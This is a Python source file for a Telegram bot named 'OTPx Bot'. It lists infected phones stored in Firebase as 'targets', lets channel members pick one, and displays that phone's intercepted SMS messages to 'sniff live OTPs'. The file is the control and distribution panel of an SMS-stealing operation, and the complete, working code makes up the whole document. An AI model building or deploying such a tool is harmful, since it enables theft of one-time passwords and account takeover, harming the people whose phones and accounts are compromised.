import os
import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
from dotenv import load_dotenv
import asyncio

# Load env
load_dotenv()
BOT_TOKEN = os.getenv('BOT_TOKEN')
CHANNEL_USERNAME = os.getenv('CHANNEL_USERNAME', 'RSPANNEL')

# Firebase init
from firebase.config import init_firebase, get_devices, get_device_by_id
from utils.helpers import format_target_list, format_sms_display

init_firebase()

# Setup logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Check if user is in channel
async def is_user_in_channel(context, user_id):
    try:
        member = await context.bot.get_chat_member(
            chat_id=f'@{CHANNEL_USERNAME}',
            user_id=user_id
        )
        return member.status in ['member', 'administrator', 'creator']
    except Exception as e:
        logger.error(f"Channel check failed: {e}")
        return False

# /start command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_name = update.effective_user.first_name
    
    # Check channel membership
    if not await is_user_in_channel(context, user_id):
        await update.message.reply_text(
            f"👋 Welcome {user_name}!\n\n"
            f"⚠️ Please join our channel first:\n"
            f"🔗 @{CHANNEL_USERNAME}\n\n"
            f"After joining, tap /start again."
        )
        return
    
    # Fetch devices
    devices = get_devices()
    targets = format_target_list(devices)
    
    if not targets:
        await update.message.reply_text("⚠️ No active targets available right now.")
        return
    
    # Build keyboard
    keyboard = []
    row = []
    for i, target in enumerate(targets, 1):
        btn = InlineKeyboardButton(f"Target {i}", callback_data=f"target_{target['id']}")
        row.append(btn)
        if len(row) == 5:  # 5 buttons per row
            keyboard.append(row)
            row = []
    if row:
        keyboard.append(row)
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        f"🔴 *{len(targets)} Unique Targets Online!*\n"
        f"Select a target to sniff live OTPs. 🔴\n\n"
        f"📊 *Showing {len(targets)} active devices*",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )

# Callback handler for target selection
async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    device_id = query.data.replace('target_', '')
    device_data = get_device_by_id(device_id)
    
    if not device_data:
        await query.edit_message_text("⚠️ Target not found or offline.")
        return
    
    display = format_sms_display(device_data, device_id)
    
    # Split long messages if needed
    if len(display) > 4096:
        parts = [display[i:i+4096] for i in range(0, len(display), 4096)]
        for part in parts:
            await query.message.reply_text(part, parse_mode='Markdown')
    else:
        await query.edit_message_text(display, parse_mode='Markdown')

# /help command
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "📖 *OTPx Bot Commands:*\n\n"
        "/start - Show target list\n"
        "/help - Show this help\n"
        "/status - Show bot status\n\n"
        "Select a target number to view live SMS."
    )

# /status command
async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    devices = get_devices()
    targets = format_target_list(devices)
    await update.message.reply_text(
        f"📊 *Bot Status*\n\n"
        f"🔴 Active Targets: {len(targets)}\n"
        f"🟢 Bot Online: Yes\n"
        f"📡 Channel: @{CHANNEL_USERNAME}"
    )

# Webhook handler for Vercel
async def webhook(request):
    try:
        # Initialize application
        app = Application.builder().token(BOT_TOKEN).build()
        
        # Add handlers
        app.add_handler(CommandHandler("start", start))
        app.add_handler(CommandHandler("help", help_command))
        app.add_handler(CommandHandler("status", status_command))
        app.add_handler(CallbackQueryHandler(button_callback))
        
        # Process update
        if request.method == 'POST':
            update = Update.de_json(await request.json(), app.bot)
            await app.process_update(update)
            return {'ok': True}
        
        return {'ok': False, 'message': 'Method not allowed'}
    except Exception as e:
        logger.error(f"Webhook error: {e}")
        return {'ok': False, 'error': str(e)}

# For local testing
if __name__ == '__main__':
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("status", status_command))
    app.add_handler(CallbackQueryHandler(button_callback))
    
    print("🤖 OTPx Bot running on polling mode...")
    app.run_polling(allowed_updates=Update.ALL_TYPES)
